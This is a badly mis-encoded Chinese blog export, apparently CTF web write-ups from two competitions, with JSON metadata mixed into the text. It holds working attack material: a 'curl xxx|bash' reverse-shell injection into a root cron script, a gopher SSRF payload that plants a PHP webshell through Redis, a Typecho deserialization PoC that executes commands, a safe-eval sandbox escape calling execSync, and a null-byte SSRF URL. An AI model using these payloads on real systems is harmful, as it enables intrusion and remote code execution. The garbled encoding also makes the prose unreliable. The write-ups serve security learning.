é¦–å…ˆç†è®ºä¸Šåº”è¯¥æ¥ä¸ªæ‰«æè„šæœ¬çš„ã€‚ä¸è¿‡è¿™é‡Œå¾ˆæ˜æ˜¾å°±èƒ½åœ¨æ ¹ç›®å½•ls -laæ—¶å‘ç°auto.shæ˜¯rootç”¨æˆ·è¿è¡Œä¸€ä¸ªpythonè„šæœ¬ï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚æ‰¾åˆ°pythonè„šæœ¬åå‘ç°æœ‰å†™çš„æƒé™ã€‚ é‚£å°±å¾ˆç®€å•äº†,ç›´æ¥å†™å…¥å‘½ä»¤import os;os.system(&#39;curl xxx|bash&#39;)(è¿™é‡Œä¹‹å‰ä¸ºäº†å¼¹www-dataçš„shellæå‰å‡†å¤‡å¥½äº†åå¼¹è„šæœ¬)ç„¶åç­‰å¾…ç›‘å¬çš„ç«¯å£è¿”å›rootshellå³å¯ã€‚flagåœ¨rootç›®å½•ä¸‹ EZä¸‰å‰‘å®¢-EzWebè¿™é¢˜äºŒè¡€ã€‚ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„é¢˜ç›®ã€‚ é¦–å…ˆä¼šå‘ç°é¦–é¡µåŠŸèƒ½ä¼¼ä¹æ˜¯ä¸ªssrfã€‚ç„¶åè¿˜ç»™å‡ºäº†?secretå‚æ•°çœ‹ipåœ°å€.ä¸è¿‡å…¶å®è¿™é‡Œå¹¶ä¸éœ€è¦ç»™ipçš„,å› ä¸ºå¯ä»¥ç›´æ¥è¯»/etc/hosts å½“ç„¶,æƒ³è¦å¸¸è§„çš„fileåè®®è¯»è‚¯å®šæ˜¯ä¸è¡Œçš„.ä½†æ˜¯å®ƒè¿‡æ»¤çš„ä¸ä¸¥ï¼Œå¯ä»¥ç”¨ç±»ä¼¼xxeé‡Œåˆ©ç”¨fileåè®®åˆ—ç›®å½•çš„æ–¹å¼æ¥è¯»file:/var/www/html/index.phpå¾—åˆ°æºç  1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET['submit']))&#123; $url = $_GET['url']; //echo $url.\"\\n\"; if(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match)) &#123; //var_dump($match); die('åˆ«è¿™æ ·'); &#125; curl($url);&#125;if(isset($_GET['secret']))&#123; system('ifconfig');&#125;?&gt; ä¸è¿‡flagå¹¶ä¸åœ¨æœ¬æœº173.92.140.13ã€‚å®é™…ä¸Šè¿™ç§æ–¹å¼æƒ³è¯»æ ¹ç›®å½•ä¹Ÿå¹¶ä¸å¯è¡Œã€‚ä½†åŸºäºè¿™é‡Œæ˜¯ä¸ªcurlçš„ssrfã€‚é‚£ä¹ˆå°±å¤§æœ‰å¯ä¸ºã€‚ä¸è¿‡è¿™ä¸€æ­¥æµªè´¹äº†ä¸å°‘æ—¶é—´,åé¢æ‰ååº”è¿‡æ¥å¯ä»¥é¡ºç€æ¢å†…ç½‘ã€‚å°è¯•ç›´æ¥é¡ºç€ipæ¢å†…ç½‘å­˜æ´»ä¸»æœº,å‘ç°173.92.140.13,æç¤ºå…¶ä»–ç«¯å£,çŒœæµ‹æ˜¯redisæˆ–è€…mysqlä¹‹ç±»çš„ã€‚äºæ˜¯æ¢6379ç«¯å£å¾—åˆ°redisçš„æŠ¥é”™å‘½ä»¤ã€‚é‚£ä¹ˆåŸºæœ¬å¯ä»¥ç¡®è®¤æ˜¯gopheråè®®åˆ©ç”¨ssrfæ‰“redisæœªæˆæƒgetshelläº†ã€‚å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« Rediså’ŒSSRF å‘½ä»¤çš„æ„å»ºä¸»è¦æ˜¯ç¼–ç é—®é¢˜ã€‚æŠŠå‘½ä»¤è¿›è¡Œæ­£ç¡®ç¼–ç å°±èƒ½æ‰“äº† 1gopher:&#x2F;&#x2F;173.92.140.13:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A è¿™æ ·å°±åœ¨140.13é‚£å†™å…¥webshellã€‚ç„¶åç›´æ¥173.92.140.13/shell.php?cmd=cat%20/flagå³å¯ EZä¸‰å‰‘å®¢-EzTypechoè¿™é¢˜çœŸçš„å¯æƒœã€‚æ¯”èµ›æ—¶å› ä¸ºå…¶ä»–é¢˜ç›®æ²¡æ¥å¾—åŠçœ‹ã€‚ç»“æœå‘ç°åŸºæœ¬å°±æ˜¯åŸæœ¬çš„é“¾å­åŠ ä¸Šä¸€ä¸ªbypasså°±è¡Œäº†ã€‚ å…ˆæ¥è¿‡ä¸‹æºç ã€‚å…³äºtypeechoçš„æ´å‡ºåœ¨install.phpç®—æ˜¯æ¯”è¾ƒç†ŸçŸ¥çš„äº†ã€‚æ‰€ä»¥ç½‘ä¸ŠåŸºæœ¬ä¸¤ä¸ªç‰ˆæœ¬çš„POPé“¾ã€‚å¦‚æœæœ‰install.phpå°±å¯ä»¥æŒ‰ç¬¬ä¸€ä¸ªçš„æ€è·¯èµ°ã€‚é¦–å…ˆè¿™é‡Œçš„æºç è¡¨æ˜å¿…é¡»getfinishå‚æ•°ä»¥åŠå¸¦ä¸ŠRefereræ‰ä¸ä¼šé€€å‡ºã€‚ æ¥ä¸‹æ¥æ˜¯ååºåˆ—åŒ–ç‚¹è¿™é‡Œå®é™…ä¸ŠåªåŠ ä¸Šäº†ä¸€ä¸ªsessionçš„åˆ¤æ–­ã€‚å¦‚æœä»¥å‰æœ‰ç°æˆçš„pocbypassäº†è¿™ä¸ªåˆ¤æ–­å°±èƒ½ç›´æ¥æ‰“äº†ã€‚è¿™é‡Œè‡ªå·±å…ˆæŒ‰ç…§é“¾å­è·Ÿä¸€ä¸‹ã€‚ ä¸Šé¢æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®è¢«é€è¿›å®ä¾‹åŒ–äº†ä¸€ä¸ªTypeecho_Dbç±»é‡Œã€‚è·Ÿè¿›ä¸‹å‘ç°æ„é€ æ–¹æ³•è°ƒç”¨äº†call_user_func()ç„¶åcall_user_funcçš„å‚æ•°$adapterNameæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ã€‚é‚£è¯´æ˜å¯ä»¥è§¦å‘__toString.æˆ‘ä»¬å…¨å±€æ‰¾ä¸‹__toStringæ‰¾åˆ°var\\Typecho\\Feed.phpå…¶é­”æœ¯æ–¹æ³•ä¸­æœ‰è¿™æ ·ä¸€æ®µè¿™é‡Œitemæ˜¯éå†itemså¾—æ¥çš„ã€‚è€Œitemså¯æ§ã€‚å¹¶ä¸”ç”±äºç®­å¤´æ‰€æŒ‡ä½ç½®è°ƒç”¨äº†screennameå±æ€§ã€‚å› æ­¤å¯èƒ½å¯ä»¥è§¦å‘__getæ–¹æ³•å…¨å±€æœæ‰¾åˆ°var\\Typecho\\Request.php 1234public function __get($key)&#123; return $this-&gt;get($key);&#125; è€Œgetæ˜¯æˆ‘ä»¬ä¸Šé¢è¦è§¦å‘__get,æ˜¯å› ä¸ºè°ƒç”¨äº†screneNameå±æ€§ã€‚é‚£ä¹ˆè§¦å‘getçš„è¯å°±æ˜¯å¯¹åº”äº†$keyã€‚å¯ä»¥çœ‹åˆ°æœ€åè¢«é€è¿›_applyFilterçš„å‚æ•°å€¼æ¥è‡ªparams[$key]ä»ç„¶æ˜¯å¯æ§çš„æœ€åå°±æ˜¯è·Ÿè¿›å‡½æ•°äº†ã€‚å‘ç°è°ƒç”¨call_user_funcå¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚å‚æ•°å¯æ§ã€‚æ‰€ä»¥é“¾å­åˆ°æ­¤ç»“æŸã€‚ poc 12345678910111213141516171819&lt;?phpclass Typecho_Request&#123; private $_params = array('screenName'=&gt;'cat /flag'); private $_filter = array('system');&#125;class Typecho_Feed&#123; private $_type = 'RSS 2.0'; private $_items; public function __construct() &#123; $this-&gt;_items=array(array(\"author\"=&gt;new Typecho_Request())); &#125;&#125;$config=array(\"adapter\"=&gt;new Typecho_Feed(),\"prefix\"=&gt;'byc');echo base64_encode(serialize($config));?&gt; æœ€åå†å›åˆ°å¼€å§‹æåˆ°çš„é—®é¢˜ã€‚æƒ³è¦è§¦å‘ååºåˆ—åŒ–å¿…é¡»è¦æœ‰ä¸ªsession.ä¸è¿‡å…¶å®ä¹Ÿæœ‰å¥½å‡ é“é¢˜è®¾åŠåˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚æˆ‘ä»¬åˆ©ç”¨phpçš„ç‰¹æ€§ã€‚å¸¦ä¸Šphp_session_upload_progressä¸Šä¼ æ–‡ä»¶ã€‚å¹¶ä¸”cookieå¸¦ä¸ŠPHPSESSIDã€‚å°±ä¼šå‘ç°ä¸ä¼šè§¦å‘å®ƒæç¤ºno, you can&#39;t unserialize it without session QAQäº†ç»“æœ å½“ç„¶è¿™é¢˜ä¸æŒ‰è¿™ä¸ªæ€è·¯æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚å› ä¸ºgetä¼ å‚startå¤„ä¹Ÿæœ‰ä¸€ä¸ªååºåˆ—åŒ–ã€‚ç›´æ¥æ‰“ä¹Ÿæ²¡é—®é¢˜ã€‚æ€»ä¹‹è¿™é¢˜èŠ±çš„æ—¶é—´æ˜¯æœ€çŸ­çš„,æ¯”èµ›æ—¶æ²¡åšçœŸçš„å¯æƒœã€‚ EZä¸‰å‰‘å®¢-EzNodeè¿™é¢˜è·Ÿä¹‹å‰åšnpuctfæ—¶çš„ä¸€é“nodeå·®ä¸å¤šã€‚ä¸è¿‡è¿™é‡Œç›´æ¥ç”¨çš„safe-evalåº“ã€‚æ˜¾ç„¶æ˜¯æœ‰pocå¯é€ƒé€¸çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰è‚¯å®šæœ‰wafè¦ç»•ã€‚ 12345678910111213141516171819202122app.use((req, res, next) =&gt; &#123; if (req.path === '/eval') &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹ setTimeout(() =&gt; &#123; clearTimeout(t); console.log('timeout'); try &#123; res.send('Timeout!'); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); è¿™é‡Œsettimoutä¼šå‘ç°å¯¼è‡´æˆ‘ä»¬çš„payloadéƒ½æ— æ³•æ‰§è¡Œã€‚å› æ­¤éœ€è¦ç»•è¿‡,è®©delayå°äº1000æ‰èƒ½è¿›åˆ°safeevalçš„è·¯ç”±é‡Œã€‚https://stackoverflow.com/questions/3468607/why-does-settimeout-break-for-large-millisecond-delay-valuesè¿™é‡Œå­˜åœ¨ä¸€ä¸ªissueã€‚å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„delayå¦‚æœå¤§å°è¶…è¿‡32ä½ï¼Œä¼šè¢«settimeoutè®¾ä¸º1.è¿™æ ·å°±æ»¡è¶³æ¡ä»¶äº†ã€‚åé¢æœåˆ°çš„safe-evalçš„pocç›´æ¥æ‰“ 1234567891011121314151617181920212223242526272829303132333435363738const theFunction = function () &#123; const f = Buffer.prototype.write; const ft = &#123; length: 10, utf8Write()&#123; &#125; &#125;; function r(i)&#123; var x = 0; try&#123; x = r(i); &#125;catch(e)&#123;&#125; if(typeof(x)!=='number') return x; if(x!==i) return x+1; try&#123; f.call(ft); &#125;catch(e)&#123; return e; &#125; return null; &#125; var i=1; while(1)&#123; try&#123; i=r(i).constructor.constructor(\"return process\")(); break; &#125;catch(x)&#123; i++; &#125; &#125; return i.mainModule.require(\"child_process\").execSync(\"id\").toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); æ”¹æˆIIFEå½¢å¼ç›´æ¥æ‰“ã€‚ (function(){xxxxx})() CVEç‰ˆç­¾åˆ°è¿™é¢˜æˆ‘æ˜¯çœŸçš„æ²¡ç†è§£å‡ºé¢˜äººçš„æ„æ€ã€‚åé¢æé†’äº†CVEåè¿˜æ˜¯æ²¡ç†è§£å‡ºé¢˜äººçš„æ„æ€â€¦â€¦ç»“æœå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨è¿™é¢˜ä¸Šäº†ã€‚ è¿›å»åä¼¼ä¹æ˜¯ä¸€ä¸ªssrfã€‚ç„¶ååªæœ‰.ctfhub.comæ‰ä¼šè§¦å‘åŠ¨ä½œçš„æ ·å­ã€‚å› æ­¤åˆ¤æ–­åº”è¯¥æ˜¯æœ‰ä¸ªæ­£åˆ™äº†ã€‚ç„¶åå‘ç°headeré‡Œæç¤ºflagåœ¨localhost,å¹¶ä¸”Hostè¦ä»¥123ç»“å°¾ã€‚ è¿™é‡Œæˆ‘è™½ç„¶å¤§æ¦‚æ˜ç™½åç«¯è¿è¡Œæµç¨‹ï¼Œä½†æ˜¯è¿˜æ˜¯æé”™äº†å‡ºé¢˜äººçš„æ„å›¾ã€‚å¤ªéš¾å—äº†ã€‚è¿ç”¨åˆ°çš„CVEå…¶å®å°±æ˜¯getheaderçš„CVEã€‚ä¹‹å‰BJDåˆšåˆšè€ƒè¿‡ã€‚è¿™ä¸ªå‡½æ•°ç‰¹ç‚¹å°±æ˜¯ä¼šå»è¯·æ±‚å¹¶è¿”å›header.ä½†æ˜¯CVEå‘Šè¯‰æˆ‘ä»¬,å¦‚æœæ˜¯ç”¨%00æˆªæ–­,å°±å¯èƒ½è®©å‘½ä»¤å»è¯·æ±‚ç”¨æˆ·çš„å¯æ§ç½‘å€ã€‚ åœ¨äº†è§£åˆ°è¿™ä¸ªCVEåï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¦è¿”å›å¤´é‡Œçš„Hostä¸º123ç»“æŸã€‚ç»“æœæœ€åæ‰çŸ¥é“åŸæ¥æ˜¯è¦è¯·æ±‚127.0.0.123ã€‚ã€‚ã€‚ä¸çŸ¥é“è¯´å•¥,åªèƒ½è¯´è‡ªå·±æŠŠæç¤ºææˆè¦ç»•çš„wafäº†ã€‚payloadurl=http://127.0.0.123%00.ctfhub.com å°ç»“è¿™æ¬¡æ¯”èµ›è™½ç„¶åé¢åŸºæœ¬å°±æ²¡èŠ±æ—¶é—´äº†ï¼Œä½†æ˜¯æ”¶è·æŒºå¤§çš„.è‡³å°‘å‘ç°è‡ªå·±ä¸´åœºå˜é€šçš„èƒ½åŠ›è¿˜æ˜¯å¾ˆå·®å°±è·Ÿå¹³æ—¶å­¦ä¸šä¸€æ ·â€¦ä¸è¿‡è¿˜æ˜¯å¾—ç¨³æ‰ç¨³æ‰“å§ã€‚æœ€åè¿˜å‰©ä¸€åœºRCTFè¿™ä¸ªå­¦æœŸå°±è¦æš‚æ—¶è·ŸCTFè¯´å†è§äº†ã€‚äº‰å–èƒ½å†å‘æŒ¥çš„ç¨³ä¸€ç‚¹ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"ç½‘é¼æ¯-é’é¾™ç»„-WEB-writeup","slug":"ç½‘é¼æ¯-é’é¾™ç»„-WEB-writeup","date":"2020-05-10T09:24:43.000Z","updated":"2021-02-18T05:08:40.269Z","comments":true,"path":"2020/05/10/ç½‘é¼æ¯-é’é¾™ç»„-WEB-writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/","excerpt":"ç½‘é¼é’é¾™ç»„æˆåŠŸæŒºè¿›çº¿ä¸‹,å½“ç„¶è¦æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ç»™åŠ›å‘æŒ¥,X1cä¸¤åªé˜Ÿä¹Ÿèƒ½æˆåŠŸä¼šå¸ˆåŠå†³èµ›äº†.(å°±æ˜¯å¯¹æˆ‘è¿™æ ·çš„awdå°ç™½è€Œè¨€ä¼°è®¡åˆæ˜¯å»å½“ç‚®ç°äº†) è¯´ä¸‹æ¯”èµ›æ„Ÿå—å§ã€‚è€å®è¯´webæ‰‹æ¯”èµ›ä½“éªŒå¹¶ä¸å¥½ã€‚å¼€èµ›åˆ°12ç‚¹æ‰å‡ºç°ç¬¬ä¸€é“WEBé¢˜.è€Œè¿™ä¹‹å‰å”¯ä¸€ä¸€ä¸ªç­¾åˆ°é¶æœºé¢˜æˆ‘å¼€äº†ä¸€ä¸ªå°æ—¶éƒ½æ˜¯åçš„â€¦ç„¶åæ˜¯æ¯”èµ›æ°›å›´,è€å®è¯´æ˜çœ¼äººåº”è¯¥éƒ½çœ‹å¾—å‡ºæ¥äº†ã€‚ä¸­é—´pyä»€ä¹ˆçš„å°±ä¸å¤šè¯´äº†ã€‚javaé‚£é¢˜æˆ‘çœ¼çççœ‹ç€5åˆ†é’Ÿå†…æ¶¨äº†å‡ åè§£ã€‚è‡³äºå…¶ä»–å‡ ä¸ªäºŒè¿›åˆ¶çš„é¢˜æ›´ä¸ç”¨æ,åšå‡ºæ¥çš„äººæ•°å°±æ˜¯é“è¯äº†ã€‚æœ€åäº”åˆ†é’Ÿå†…ï¼Œåå‡ ç§’æ—¶é—´æˆ‘ä»¬é˜Ÿæ‰äº†åå¤šåç„¶ååˆè¹¦å›æ¥äº†å°±å¾ˆè¿·ã€‚ç„¶ååŠ¨æ€é¶æœºä¸€é˜Ÿåªèƒ½å¼€ä¸€ä¸ª,è€å®è¯´å¾ˆå¤§ç¨‹åº¦ä¸ŠæŸç¼šäº†å¼€é¢˜çš„èŠ‚å¥ã€‚ æ¯”èµ›éš¾åº¦å€’è¿˜èƒ½æ¥å—ã€‚æŒ‰éƒå¸ˆå‚…è¯´çš„,è¿™æ¬¡æ²¡ak webä¸å¤ªåº”è¯¥ã€‚å½“ç„¶å…¶å®æ˜¯æœ€åçœ‹ç€åªå‰©10å¤šåˆ†é’Ÿæ—¶åæ¬¡ç¨³äº†å°±åšä¸åŠ¨äº†.èµ›åå¤ç°æœ€åä¸€ä¸ªé¢˜æ—¶ä¹Ÿå‘ç°ç¡®å®ä¸æ”¹å®Œæ²¡åšå‡ºæ¥çš„ã€‚æ€»ä¹‹è¿™é‡ŒæŠŠæ‰€æœ‰WEBé¢˜è§£éƒ½è®°å½•ä¸‹å§ã€‚","text":"ç½‘é¼é’é¾™ç»„æˆåŠŸæŒºè¿›çº¿ä¸‹,å½“ç„¶è¦æ„Ÿè°¢é˜Ÿå‹ä»¬çš„ç»™åŠ›å‘æŒ¥,X1cä¸¤åªé˜Ÿä¹Ÿèƒ½æˆåŠŸä¼šå¸ˆåŠå†³èµ›äº†.(å°±æ˜¯å¯¹æˆ‘è¿™æ ·çš„awdå°ç™½è€Œè¨€ä¼°è®¡åˆæ˜¯å»å½“ç‚®ç°äº†) è¯´ä¸‹æ¯”èµ›æ„Ÿå—å§ã€‚è€å®è¯´webæ‰‹æ¯”èµ›ä½“éªŒå¹¶ä¸å¥½ã€‚å¼€èµ›åˆ°12ç‚¹æ‰å‡ºç°ç¬¬ä¸€é“WEBé¢˜.è€Œè¿™ä¹‹å‰å”¯ä¸€ä¸€ä¸ªç­¾åˆ°é¶æœºé¢˜æˆ‘å¼€äº†ä¸€ä¸ªå°æ—¶éƒ½æ˜¯åçš„â€¦ç„¶åæ˜¯æ¯”èµ›æ°›å›´,è€å®è¯´æ˜çœ¼äººåº”è¯¥éƒ½çœ‹å¾—å‡ºæ¥äº†ã€‚ä¸­é—´pyä»€ä¹ˆçš„å°±ä¸å¤šè¯´äº†ã€‚javaé‚£é¢˜æˆ‘çœ¼çççœ‹ç€5åˆ†é’Ÿå†…æ¶¨äº†å‡ åè§£ã€‚è‡³äºå…¶ä»–å‡ ä¸ªäºŒè¿›åˆ¶çš„é¢˜æ›´ä¸ç”¨æ,åšå‡ºæ¥çš„äººæ•°å°±æ˜¯é“è¯äº†ã€‚æœ€åäº”åˆ†é’Ÿå†…ï¼Œåå‡ ç§’æ—¶é—´æˆ‘ä»¬é˜Ÿæ‰äº†åå¤šåç„¶ååˆè¹¦å›æ¥äº†å°±å¾ˆè¿·ã€‚ç„¶ååŠ¨æ€é¶æœºä¸€é˜Ÿåªèƒ½å¼€ä¸€ä¸ª,è€å®è¯´å¾ˆå¤§ç¨‹åº¦ä¸ŠæŸç¼šäº†å¼€é¢˜çš„èŠ‚å¥ã€‚ æ¯”èµ›éš¾åº¦å€’è¿˜èƒ½æ¥å—ã€‚æŒ‰éƒå¸ˆå‚…è¯´çš„,è¿™æ¬¡æ²¡ak webä¸å¤ªåº”è¯¥ã€‚å½“ç„¶å…¶å®æ˜¯æœ€åçœ‹ç€åªå‰©10å¤šåˆ†é’Ÿæ—¶åæ¬¡ç¨³äº†å°±åšä¸åŠ¨äº†.èµ›åå¤ç°æœ€åä¸€ä¸ªé¢˜æ—¶ä¹Ÿå‘ç°ç¡®å®ä¸æ”¹å®Œæ²¡åšå‡ºæ¥çš„ã€‚æ€»ä¹‹è¿™é‡ŒæŠŠæ‰€æœ‰WEBé¢˜è§£éƒ½è®°å½•ä¸‹å§ã€‚ AreUserializeä»Šæ—¥ç„å­¦é¢˜ã€‚é¦–å…ˆæ˜¯æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(\"flag.php\");highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == \"1\") &#123; $this-&gt;write(); &#125; else if($this-&gt;op == \"2\") &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(\"Bad Hacker!\"); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(\"Too long!\"); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); &#125; else &#123; $this-&gt;output(\"Failed!\"); &#125; &#125; private function read() &#123; $res = \"\"; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo \"[Result]: &lt;br&gt;\"; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;'str'&#125;)) &#123; $str = (string)$_GET['str']; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; åŠŸèƒ½ä¸Šæœ‰ä¸€ä¸ªä»»æ„å†™è·Ÿä»»æ„è¯»ã€‚åªéœ€è¦è¿‡ä¸€ä¸ªvalidå‡½æ•°æ£€æŸ¥å°±èƒ½ååºåˆ—åŒ–ã€‚opçš„å€¼å†³å®šäº†è¯»/å†™åŠŸèƒ½ã€‚ é¦–å…ˆææ„å‡½æ•°æ˜æ˜¾æ˜¯å…¥æ‰‹ç‚¹ã€‚ä½†æ˜¯ä»–é™åˆ¶äº†å½“opä¸º&quot;2&quot;æ—¶ä»¤opä¸º&quot;1&quot;ä¹Ÿå°±æ˜¯å†™åŠŸèƒ½ã€‚ç„¶ååˆç½®å†…å®¹ä¸ºç©ºã€‚è·Ÿè¿›åˆ°process()å‡½æ•°çœ‹ä¸‹,ä¼šæ˜æ˜¾çš„å‘ç°å®ƒé‡‡ç”¨äº†$this-&gt;op == &quot;2&quot;è¿™æ ·çš„å¼±ç±»å‹ç›¸ç­‰åˆ¤æ–­ã€‚é‚£ä¹ˆæ¼æ´å¾ˆæ˜æ˜¾äº†,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ææ„å‡½æ•°çš„é™åˆ¶,è¾¾æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚ ä¸è¿‡æ³¨æ„çš„æ˜¯,åŸé¢˜çš„Filehandlerç±»å±æ€§éƒ½æ˜¯protected,è¡¨ç°å‡ºæ¥çš„ç»“æœå°±æ˜¯åºåˆ—åŒ–æ•°æ®æœ‰ç©ºå­—ç¬¦ã€‚è€Œè¿™æ˜¯è¿‡ä¸äº†is_valid()çš„æ£€æŸ¥çš„ ä½†æ˜¯ä¸è¦ç´§ã€‚php7.2+ç‰ˆæœ¬ä¸‹ååºåˆ—åŒ–å¹¶ä¸åœ¨ä¹ä½ ä¼ å…¥çš„æ•°æ®å±æ€§æ˜¯å¦æ˜¯protectedã€‚æ‰€ä»¥æˆ‘ä»¬æ”¹æˆpublicå³å¯ã€‚ 12345678910&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = \"file:///web/html/flag.php\";&#125;$o = new FileHandler();echo urlencode(serialize($o)); 2==&quot;2&quot;,&quot;2e0&quot;==&quot;2&quot;è¿™ç§æŠ€å·§ä¸ç”¨å¤šè¯´äº†ã€‚è¿™é‡Œè¦è§£é‡Šçš„æ˜¯æ¯”è¾ƒå‘çš„åé¢çš„filenameã€‚å¼€å§‹ç›´æ¥ä¼ªåè®®è¯»flag.phpè¯»ä¸åˆ°ã€‚è¿™ä¸ªä»æºç è§’åº¦è®²å®Œå…¨æ²¡é“ç†ã€‚ç„¶ååªèƒ½å°è¯•ç”¨ç»å¯¹è·¯å¾„è¯»äº†ã€‚åŸºäºæˆ‘ä»¬å…¶ä»–æ–‡ä»¶éƒ½èƒ½è½»æ¾è¯»åˆ°,æˆ‘ä»¬å…ˆæ„é€ ä¸ª404çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆæœåŠ¡å™¨ã€‚å‘ç°æ˜¯ Alpineçš„é•œåƒã€‚äºæ˜¯æŸ¥äº†æ³¢å…¶webè·¯å¾„çš„é…ç½®/web/config/httpd.confç„¶åå¾—åˆ°webè·¯å¾„åæ¢ç»å¯¹è·¯å¾„å°±è¯»åˆ°äº†ï¼Œç„å­¦é—®é¢˜ã€‚ psï¼šèµ›åçªç„¶æƒ³èµ·æ¥åŸæ¥åœ¨åšD^3æ—¶è¸©è¿‡çš„ä¸€ä¸ªå‘ã€‚å°±æ˜¯apacheçš„ææ„å‡½æ•°æ‰§è¡Œæ—¶å·¥ä½œç›®å½•å¯èƒ½ä¼šå˜ã€‚æ‰€ä»¥ç”¨ç›¸å¯¹è·¯å¾„è¯»æ—¶æ˜¯è·å–ä¸åˆ°flag.phpçš„.å½“ç„¶è¿™æ˜¯æ¦‚ç‡é—®é¢˜ã€æœ‰çš„äººå°±èƒ½ç›´æ¥è¯»åˆ°ã€‚ filejavaè¿™é¢˜èƒ½å‡º200è§£æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°çš„,ä¸»è¦ä¸­é—´é‚£æ³¢å‚ç›´ä¸Šåˆ†å¤ªçªå…€äº†ã€‚ä½†ä»”ç»†æƒ³æˆ‘ä¹Ÿæ˜¯é‚£ä¸ªæ—¶é—´äº¤çš„flagâ€¦ å½“ç„¶é¢˜ç›®è‚¯å®šæ˜¯ç®€å•é¢˜ã€‚é¦–å…ˆè¿›å»æœ‰ä¸€ä¸ªæˆ‘å¼€å§‹å¿½ç•¥çš„ä¿¡æ¯å°±æ˜¯å®ƒåœ¨uploadç•Œé¢æç¤ºflagåœ¨/flagã€ç„¶åéšä¾¿ä¸Šä¼ ä¸ªæ–‡ä»¶,é©¬ä¸Šå°±æµ‹å‡ºæ˜¯ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ é‚£è€å¥—è·¯å…ˆä»/WEB-INF/web.xmlå¼€å§‹ 12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" id=\"WebApp_ID\" version=\"2.5\"&gt; &lt;display-name&gt;file_in_java&lt;/display-name&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt; 